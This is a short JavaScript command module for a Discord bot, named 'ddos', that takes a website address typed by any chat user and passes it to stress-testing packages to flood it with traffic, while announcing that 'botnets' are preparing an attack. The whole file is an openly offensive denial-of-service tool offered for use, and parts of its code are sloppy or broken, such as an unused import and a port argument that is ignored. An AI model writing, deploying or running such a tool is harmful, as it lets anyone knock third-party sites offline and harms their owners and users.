const Discord = require ("discord.js");
const ddos = require ('simple-ddos');
var Stress = require('ddos-stress');
var stress = new Stress();
exports.run = (client, message, args) => {


var site = args.slice(0).join(" ");


message.channel.send(`Botnets Are Preparing for Attack...`).then ;
message.channel.send(`Sending Packets`)
Stress.run(site,10);
  
  
  
};
exports.conf = {
    enabled: true, 
    aliases: [], 
    permLevel: 0 
  };
  
  exports.help = {
    name: 'ddos', 
    description: 'DDos [BETA]', 
    usage: 'ddos <Site w/Http(s)> <port>' 
  };